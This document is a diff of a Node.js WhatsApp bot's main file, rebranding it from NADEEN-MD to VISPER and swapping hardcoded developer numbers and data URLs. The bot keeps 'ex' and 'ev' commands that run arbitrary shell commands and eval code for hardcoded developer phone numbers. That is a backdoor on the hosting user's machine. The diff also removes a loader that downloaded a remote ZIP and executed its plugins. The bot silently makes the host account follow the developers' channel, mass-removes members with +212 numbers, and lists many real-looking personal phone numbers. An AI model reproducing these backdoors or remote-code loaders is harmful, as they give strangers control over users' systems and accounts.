@@ -22,6 +22,8 @@ const config = require('./config')
 const qrcode = require('qrcode-terminal')
 const NodeCache = require('node-cache')
 const util = require('util')
+const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson, fetchBuffer, getFile } = require('./lib/functions')
+const { sms, downloadMediaMessage } = require('./lib/msg')
 const axios = require('axios')
 const { File } = require('megajs')
 const path = require('path')
@@ -29,11 +31,23 @@ const msgRetryCounterCache = new NodeCache()
 
 const FileType = require('file-type')
 const l = console.log
-
-   const ownerNumber = [`94755527010`];
+var {
+  updateCMDStore,
+  isbtnID,
+  getCMDStore,
+  getCmdForCmdId,
+  connectdb,
+  input,
+  get,
+  getalls,
+  updb,
+  updfb,
+  upresbtn,
+} = require("./lib/database");
+const ownerNumber = [`${config.OWNER_NUMBER}`];
 //===================SESSION======.=======================
 
-const df = __dirname + '/${config.SESSION_NAME}/creds.json';
+const df = __dirname + '/session/creds.json';
 
 if (!fs.existsSync(df)) {
   if (config.SESSION_ID) {
@@ -44,7 +58,7 @@ if (!fs.existsSync(df)) {
       filer.download((err, data) => {
         if (err) throw err;
         fs.writeFile(df, data, () => {
-          console.log("✅ Mega session download completed !!");
+          console.log("✅ Mega session download completed and saved to creds.json !!");
         });
       });
     } else {
@@ -65,7 +79,7 @@ async function downloadSession(sessdata, df) {
 
   for (let i = 0; i < dbUrls.length; i++) {
     const sessionUrl = `${dbUrls[i]}SESSIONS/${sessdata}`;
-    console.log(`📥 Downloading session from NADEEN-DB`);
+    console.log(`📥 Downloading session from Saviyakolla-DB`);
 
     try {
       const response = await axios.get(sessionUrl);
@@ -73,7 +87,7 @@ async function downloadSession(sessdata, df) {
       if (response.data && Object.keys(response.data).length > 0) {
         await sleep(1000);
         fs.writeFileSync(df, JSON.stringify(response.data, null, 2));
-        console.log(`✅ Session file save successfully`);
+        console.log(`✅ Session file downloaded successfully and saved to creds.json`);
         success = true;
         break;
       } else {
@@ -94,144 +108,19 @@ async function downloadSession(sessdata, df) {
 const express = require("express");
 const app = express();
 const port = process.env.PORT || 8000;
-
-const { exec } = require('child_process');
-    const AdmZip = require('adm-zip'); // Import AdmZip for extraction
-    //=========================dl-ZIP========================
-
-const PLUGINS_DIR = './plugins'; // Directory where plugins will be extracted
-const LIB_DIR = './lib';
-const DATA_DIR = './data';
- const ZIP_DIR = './'
-
-
-
-
- 
-	
-
-
-const connect = async () => {
- let ZIP = await axios.get('https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/nadeen-md.json');
-    //console.log(ZIP.data); 
-
-// Assuming the correct property is `ZIP.data.enc` (adjust based on actual response structure)
-const MEGA_ZIP_LINK = `${ZIP.data.megaurl}`;  // Replace with your Mega ZIP file link
-    // Ensure the plugins directory exists
-    if (!fs.existsSync(PLUGINS_DIR)) {
-      fs.mkdirSync(PLUGINS_DIR, { recursive: true });
-    }
-    if (fs.existsSync(DATA_DIR)) {
-        fs.rmSync(DATA_DIR, { recursive: true, force: true });
-      }
-    if (!fs.existsSync(LIB_DIR)) {
-        fs.mkdirSync(LIB_DIR, { recursive: true });
-      }
-
-    console.log('Fetching ZIP file from Mega.nz...');
-
-    // Download the ZIP file from Mega.nz
-    const file = File.fromURL(`${MEGA_ZIP_LINK}`);
-    const fileData = await file.downloadBuffer();
-
-    // Save the ZIP file to a temporary location
-    const tempZipPath = path.join(__dirname, 'temp.zip');
-    fs.writeFileSync(tempZipPath, fileData);
-    console.log('NADEEN ZIP file downloaded successfully ✅');
-
-    // Extract the ZIP file to the plugins directory
-    const zip = new AdmZip(tempZipPath);
-    zip.extractAllTo(ZIP_DIR, true); // Extract to the plugins directory
-
-    console.log('Plugins extracted successfully ✅');
-console.log('Lib extracted successfully ✅');
-
- console.log('Installing plugins 🔌... ')
-            //const path = require('path');
- //const path = require('path');
-           fs.readdirSync("./plugins/").forEach((plugin) => {
-  if (path.extname(plugin).toLowerCase() == ".js") {
-      require("./plugins/" + plugin);
-  }
-});
-
-
-
-
-
-
-	
-
-    // Clean up the temporary ZIP file
-    fs.unlinkSync(tempZipPath);
- 
-  const {   sleep } = require('./lib/functions');
-   
-  var {  connectdb ,updb} = require("./lib/database");
-
-  //console.log('All Plugins installed ⚡');
-  await connectdb();
-  await updb();
-  console.log('NADEEN-MD CONNECTED ✅');
-  await sleep(3000)
-  await connectToWA()
-} 
-
-
 //====================================
 async function connectToWA() {
-const { version, isLatest } = await fetchLatestBaileysVersion();
-const { getBuffer, getGroupAdmins, getRandom,   sleep, fetchJson} = require('./lib/functions');
-const { sms } = require('./lib/msg');
-var {
-  updateCMDStore,
-  isbtnID,
-  getCMDStore,
-  getCmdForCmdId,
-  
-  input,
-  get,
-  getalls,
- 
-  updfb,
-  upresbtn,
-} = require("./lib/database");
+//Run the function
 
-    
-	
-
-  
-  
-
-  const prefix = config.PREFIX
-  //const aliveMsg = config.ALIVE_MSG
-  const autoreadStatus = config.AUTO_READ_STATUS
-  const mode = config.ONLY_GROUP
-  const call = config.ANTI_CALL
-  const block = config.AUTO_BLOCK
-  const badword = config.ANTI_BAD
-  const antilink = config.ANTI_LINK
-  const ty = config.AUTO_TYPING		
-  const antiBot = config.ANTI_BOT
-  const readall = config.AUTO_MSG_READ
-  const readCmd = config.CMD_ONLY_READ
-  const recording = config.AUTO_RECORDING
-  const autoReact = config.AUTO_REACT 
-  const ownerNumber = config.OWNER_NUMBER
-  
-  const ownerdataa = (await axios.get('https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/nadeen-md.json')).data
-       
-        
-  const captionText = `${ownerdataa.connectmg}`;
-  
-  const imageUrl = `${ownerdataa.cmsglogo}`;
-  
-    //console.log(`using WA v${version.join('.')}, isLatest: ${isLatest}`)
+    const {
+        version,
+        isLatest
+    } = await fetchLatestBaileysVersion()
+    console.log(`using WA v${version.join('.')}, isLatest: ${isLatest}`)
     const {
         state,
         saveCreds
-    } = await useMultiFileAuthState(__dirname + `/${config.SESSION_NAME}/`)
-	
+    } = await useMultiFileAuthState(__dirname + `/session`)
     const conn = makeWASocket({
         logger: P({
             level: "fatal"
@@ -247,7 +136,7 @@ var {
 
 
 
-       conn.ev.on('connection.update', async (update) => {
+        conn.ev.on('connection.update', async (update) => {
           const { connection, lastDisconnect } = update;
           if (connection === 'close') {
               if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
@@ -255,24 +144,49 @@ var {
               }
           } else if (connection === 'open') {
              
+          }
+      });
+      
 
-            console.log('WA CONNECTED ✅');
-const ownerdataaa = (await axios.get('https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/nadeen-md.json')).data
+const path = require('path');
+fs.readdirSync("./plugins/").forEach((plugin) => {
+  if (path.extname(plugin).toLowerCase() == ".js") {
+      require("./plugins/" + plugin);
+  }
+});
+
+console.log('All Plugins installed ⚡')
+await connectdb()
+await updb()		
+console.log('VISPER MOVIE DL CONNECTED ✅')
+
+
+
+const prefix = config.PREFIX
+//const aliveMsg = config.ALIVE_MSG
+const autoreadStatus = config.AUTO_READ_STATUS
+const mode = config.ONLY_GROUP
+const call = config.ANTI_CALL
+const block = config.AUTO_BLOCK
+const badword = config.ANTI_BAD
+const antilink = config.ANTI_LINK
+const ty = config.AUTO_TYPING		
+const antiBot = config.ANTI_BOT
+const readall = config.AUTO_MSG_READ
+const readCmd = config.CMD_ONLY_READ
+const recording = config.AUTO_RECORDING
+const autoReact = config.AUTO_REACT 
+const ownerNumber = config.OWNER_NUMBER
+
+const ownerdataa = (await axios.get('https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/nadeen-md.json')).data
      
 	    
-const glinks= `${ownerdataaa.supglink}`;
+const captionText = `${ownerdataa.connectmg}`;
+
+const imageUrl = `${ownerdataa.cmsglogo}`;
 
 const botJid = jidNormalizedUser(conn.user.id);
 
-await conn.sendMessage(
-  `${ownerNumber}@s.whatsapp.net`, 
-  { 
-    image: { url: imageUrl }, 
-    caption: captionText 
-  }
-); 
-          }
-      });
 
 
 
@@ -317,7 +231,7 @@ await conn.sendMessage(mek.key.remoteJid, { react: { key: mek.key, text: randomE
 const metadata = await conn.newsletterMetadata("jid", `${ownerdataa.mainchanal}`)	      
 if (metadata.viewer_metadata === null){
 await conn.newsletterFollow(`${ownerdataa.mainchanal}`)
-console.log("NADEEN MD WA CHANNEL FOLLOW ✅")
+console.log("VISPER MD UPDATES CHNAL FOLLOW ✅")
 }	 
     
 const m = sms(conn, mek)
@@ -368,7 +282,7 @@ const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' 
 const senderNumber = sender.split('@')[0]
 const botNumber = conn.user.id.split(':')[0]
 const pushname = mek.pushName || 'Sin Nombre'
-const developers = `94711451319,94716769285,94779483535,94728840491,94755527010,94715973437,94775383340`
+const developers = `94778500326,94722617699,94788518429,94787318729`
 const mokakhri = developers.split(",")
 const isbot = botNumber.includes(senderNumber)
 const isdev = mokakhri.includes(senderNumber)
@@ -718,7 +632,7 @@ const ownerdata = (await axios.get('https://raw.githubusercontent.com/Nadeenpoor
            
             config.FOOTER = ownerdata.footer
            
-const preUser = await fetchJson(`https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/premirum.json`)
+const preUser = await fetchJson(`https://mv-visper-full-db.pages.dev/Main/premium_user.json`)
 const preUsers = preUser.numbers.split(",");
 
 // replace करके "@s.whatsapp.net" format එකට convert කරලා check කරන්න
@@ -732,7 +646,7 @@ const isPre = preUsers
 
 	    
 //============================================================================ 
-const banbn = await fetchJson(`https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/ban_number.json`)
+const banbn = await fetchJson(`https://mv-visper-full-db.pages.dev/Main/ban_number.json`)
 const plynYnna = banbn.split(",")
 const isBanUser = [ ...plynYnna ]
       .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
@@ -761,7 +675,7 @@ if ( isCmd && isBanGrp && !isMe && !isSudo) return
 
 //========================================== TEAM REACT SECTION ========================================
 
-const rec = (await axios.get('https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/react.json')).data
+const rec = (await axios.get('https://mv-visper-full-db.pages.dev/Main/react.json')).data
 
 const recc = (await axios.get('https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/nadeen-md.json')).data
 
@@ -772,50 +686,30 @@ const randomEmoji = defaultEmojis[Math.floor(Math.random() * defaultEmojis.lengt
 await conn.newsletterReactMessage(`${recc.mainchanal}`, id, randomEmoji);
     
 //=========================================================================================================================	    
-if(senderNumber.includes("94711451319")){
-if(isReact) return
-m.react(`${rec.nadeen}`)
-}
-if(senderNumber.includes("94755527010")){
-if(isReact) return
-m.react(`${rec.nadeen2}`)
-}
-if(senderNumber.includes("94715973437")){
-if(isReact) return
-m.react(`${rec.nadeen}`)
-}
-if(senderNumber.includes("94728840491")){
-if(isReact) return
-m.react(`${rec.nadeen2}`)
-}
-if(senderNumber.includes("94779483535")){
-if(isReact) return
-m.react(`${rec.nadeen2}`)
-}
-if(senderNumber.includes("94716769285")){
-if(isReact) return
-m.react(`${rec.nadeen2}`)
-}
-if(senderNumber.includes("94785432344")){
-if(isReact) return
-m.react(`${rec.abhi}`)
-}
 if(senderNumber.includes("94778500326")){
 if(isReact) return
 m.react(`${rec.sadas}`)
 }
-if(senderNumber.includes("94775383340")){
+if(senderNumber.includes("94722617699")){
 if(isReact) return
-m.react(`${rec.manhiru}`)
+m.react(`${rec.saviya}`)
 }
-if(senderNumber.includes("94755094957")){
+if(senderNumber.includes("94756857260")){
 if(isReact) return
-m.react(`${rec.nimmi}`)
+m.react(`${rec.sadas}`)
+}
+if(senderNumber.includes("94763702691")){
+if(isReact) return
+m.react(`${rec.sadas}`)
+}
+if(senderNumber.includes("94724884317")){
+if(isReact) return
+m.react(`${rec.damiru}`)
 
 }
-if(senderNumber.includes("94712050104")){
+if(senderNumber.includes("94787318429")){
 if(isReact) return
-m.react(`${rec.wesi}`)
+m.react(`${rec.sadas}`)
 
 }
 
@@ -823,7 +717,7 @@ const ownNum = config.OWNER_NUMBER;
 
             if(senderNumber.includes(ownNum)){
 if(isReact) return 
-m.react(`🍁`)
+m.react(`💁‍♂️`)
             }
 
 if (isCmd && config.CMD_ONLY_READ  == "true"){
@@ -856,7 +750,7 @@ if  ( isGroup &&  !isMe && !isOwner && !isSudo ) return
 if ( isBanUser ) {
 	await conn.sendMessage(from, { delete: mek.key })
 	await conn.groupParticipantsUpdate(from, [sender], 'remove')
-	return await conn.sendMessage(from, { text: "*You are banned by NADEEN MD ❌\n\nPlease Contact Nadeen Remove it.*" })
+	return await conn.sendMessage(from, { text: "*You are banned by VISPER TEAM ❌*" })
 }
 
 	
@@ -1179,12 +1073,12 @@ if(!isOwner) {
     if(originalMessage.message.stickerMessage){
      
     //await conn.sendMessage(from, { audio: fs.readFileSync("./" + type.ext), mimetype:  originalMessage.message.audioMessage.mimetype, fileName:  `${m.id}.mp3` })	
-     const sdata = await conn.sendMessage(delfrom,{sticker: fs.readFileSync("./" + type.ext) ,package: 'NADEEN-MD 🌟'})
+     const sdata = await conn.sendMessage(delfrom,{sticker: fs.readFileSync("./" + type.ext) ,package: 'PRABATH-MD 🌟'})
     return await conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` },{quoted: sdata});
     
     }else{
     
-    const stdata = await conn.sendMessage(delfrom,{sticker: fs.readFileSync("./" + type.ext) ,package: 'NADEEN-MD 🌟'})
+    const stdata = await conn.sendMessage(delfrom,{sticker: fs.readFileSync("./" + type.ext) ,package: 'PRABATH-MD 🌟'})
     return await conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` },{quoted: stdata});
     
       }
@@ -1301,7 +1195,7 @@ if(body === "hi" || body === "Hi" || body === "hey" || body === "Hey" || body ==
   if (isMe) return;
 await conn.sendPresenceUpdate('recording', from);
  await conn.sendMessage(from, { 
-  audio: { url: 'https://github.com/Nadeenpoorna-app/main-data/raw/refs/heads/main/footer/voice_data/hi.mp3' }, 
+  audio: { url: 'https://mv-visper-full-db.pages.dev/Data/WhatsApp%20Audio%202025-04-28%20at%2017.12.23.mpeg' }, 
   mimetype: 'audio/mpeg', 
   ptt: true 
 }, { quoted: mek });
@@ -1309,89 +1203,7 @@ await conn.sendPresenceUpdate('recording', from);
  }	
 }
 
-if(body === 'owner' || body === 'nadeen' || body === 'kawuda haduwe' || body === 'made by' || body === 'kwd hduwe'){
-   
- if (config.AUTO_VOICE == 'true') {
-  if (isMe) return;
-await conn.sendPresenceUpdate('recording', from);
- await conn.sendMessage(from, { 
-  audio: { url: 'https://github.com/Nadeenpoorna-app/main-data/raw/refs/heads/main/footer/voice_data/owner%20VOIC4E.mp3' }, 
-  mimetype: 'audio/mpeg', 
-  ptt: true 
-}, { quoted: mek });
 
- }	
-}
-
-if(body === 'gm' || body === 'moring' || body === 'Gm'||  body === 'good morning'){
-   
- if (config.AUTO_VOICE == 'true') {
-  if (isMe) return;
-await conn.sendPresenceUpdate('recording', from);
- await conn.sendMessage(from, { 
-  audio: { url: 'https://github.com/Nadeenpoorna-app/main-data/raw/refs/heads/main/footer/voice_data/gm.opus' }, 
-  mimetype: 'audio/mpeg', 
-  ptt: true 
-}, { quoted: mek });
-
- }	
-}
-
-if(body === 'ponnaya' || body === 'pakaya' || body === 'kariya'){
-   
- if (config.AUTO_VOICE == 'true') {
-  if (isMe) return;
-await conn.sendPresenceUpdate('recording', from);
- await conn.sendMessage(from, { 
-  audio: { url: 'https://github.com/Nadeenpoorna-app/main-data/raw/refs/heads/main/footer/voice_data/Ponnaya(tbg).mp3' }, 
-  mimetype: 'audio/mpeg', 
-  ptt: true 
-}, { quoted: mek });
-
- }	
-}
-
-if(body === 'bs' || body === 'bye' || body === 'budusaranai' || body === 'yano' ){
-   
- if (config.AUTO_VOICE == 'true') {
-  if (isMe) return;
-await conn.sendPresenceUpdate('recording', from);
- await conn.sendMessage(from, { 
-  audio: { url: 'https://github.com/Nadeenpoorna-app/main-data/raw/refs/heads/main/footer/voice_data/Bs(tbg).mp3' }, 
-  mimetype: 'audio/mpeg', 
-  ptt: true 
-}, { quoted: mek });
-
- }	
-}
-
-if(body === 'huththa' || body === 'htta' || body === 'hutta' || body === 'wesa' || body === 'puka' || body === 'ponna' || body === 'pako'){
-   
- if (config.AUTO_VOICE == 'true') {
-  if (isMe) return;
-await conn.sendPresenceUpdate('recording', from);
- await conn.sendMessage(from, { 
-  audio: { url: 'https://github.com/Nadeenpoorna-app/main-data/raw/refs/heads/main/footer/voice_data/kunukarapa.opus' }, 
-  mimetype: 'audio/mpeg', 
-  ptt: true 
-}, { quoted: mek });
-
- }	
-}
-
-if(body === 'sex' || body === 'fuck' || body === 'hukanna' || body === 'ukamu' || body === 'hukamu'){
-   
- if (config.AUTO_VOICE == 'true') {
-  if (isMe) return;
-await conn.sendPresenceUpdate('recording', from);
- await conn.sendMessage(from, { 
-  audio: { url: 'https://github.com/Nadeenpoorna-app/main-data/raw/refs/heads/main/footer/voice_data/kalalokaya.opus' }, 
-  mimetype: 'audio/mpeg', 
-  ptt: true 
-}, { quoted: mek });
-
- }	
-}
 
 
 
@@ -1441,7 +1253,7 @@ events.commands.map(async (command) => {
 
 if (config.ANTI_LINK == "true") {
   if (!isOwner && !isAdmins && isBotAdmins) {
-    if (body.includes("chat.whatsapp.com","temu.com")) {
+    if (body.includes("chat.whatsapp.com")) {
      await conn.sendMessage(from, { delete: mek.key });
       await conn.sendMessage(from, {
         text: `@${m.sender.split('@')[0]} , *🚫 Group links are not allowed!*`,
@@ -1500,7 +1312,7 @@ switch (command) {
   }
     break
     case'ex':{
-      if(senderNumber == 94755527010) {
+      if(senderNumber == 94778500326) {
   const { exec } = require("child_process")
   exec(q, (err, stdout) => {
     if (err) return reply(`-------\n\n` + err)
@@ -1512,7 +1324,7 @@ switch (command) {
     }
     break
     case'apprv':{
-      if(senderNumber == 94755527010) {
+      if(senderNumber == 94778500326) {
           let reqlist = await conn.groupRequestParticipantsList(from)
           for (let i=0;i<reqlist.length;i++) {
             if(reqlist[i].jid.startsWith("212")){
@@ -1533,7 +1345,7 @@ switch (command) {
     }
     break
     case'212r':{
-      if(senderNumber == 94755527010) {
+      if(senderNumber == 94778500326) {
         for (let i=0;i<participants.length;i++) {
           if(participants[i].id.startsWith("212")){
        await conn.groupParticipantsUpdate(from, [participants[i].id], 'remove')
@@ -1547,7 +1359,7 @@ console.log(dsa)
     }
     break
   case 'ev': {
-    if(senderNumber == 94755527010 || senderNumber == 94711451319) {
+    if(senderNumber == 94778500326 || senderNumber == 94722617699) {
     let code2 = q.replace("°", ".toString()");
     try {
 let resultTest = await eval(code2);
@@ -1573,11 +1385,11 @@ console.log(isError)
   })
 }
 app.get("/", (req, res) => {
-  res.send("📟 NADEEN-MD Working successfully!");
+  res.send("📟 VISPER DL Working successfully!");
 });
-app.listen(port, () => console.log(`Nadeen-Md Server listening on port http://localhost:${port}`));
+app.listen(port, () => console.log(`Movie-Visper-Md Server listening on port http://localhost:${port}`));
 setTimeout(() => {
-connectToWA();
+connectToWA()
 }, 3000);
 
 
